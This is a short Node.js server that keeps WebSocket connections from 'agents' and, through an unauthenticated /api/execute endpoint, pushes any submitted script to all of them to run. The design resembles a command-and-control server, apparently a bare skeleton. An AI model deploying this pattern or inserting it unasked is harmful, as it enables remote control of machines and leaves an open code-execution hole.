const express = require('express');
const { WebSocketServer } = require('ws');
const http = require('http');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

app.use(express.json());
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

const agents = new Map();

wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const agentId = url.searchParams.get('id');
    
    if (!agentId) return ws.close(4001, 'Missing Agent ID');

    agents.set(agentId, ws);
    console.log(`[+] Agent Connected: ${agentId}`);

    ws.on('close', () => {
        agents.delete(agentId);
        console.log(`[-] Agent Disconnected: ${agentId}`);
    });
});

app.post('/api/execute', (req, res) => {
    const { script } = req.body;
    if (!script) return res.status(400).json({ error: 'No script provided' });

    let sent = 0;
    for (const [id, ws] of agents) {
        if (ws.readyState === 1) {
            ws.send(JSON.stringify({ action: 'execute', script }));
            sent++;
        }
    }
    res.json({ success: true, sent });
});

app.get('/api/agents', (req, res) => {
    res.json(Array.from(agents.keys()));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
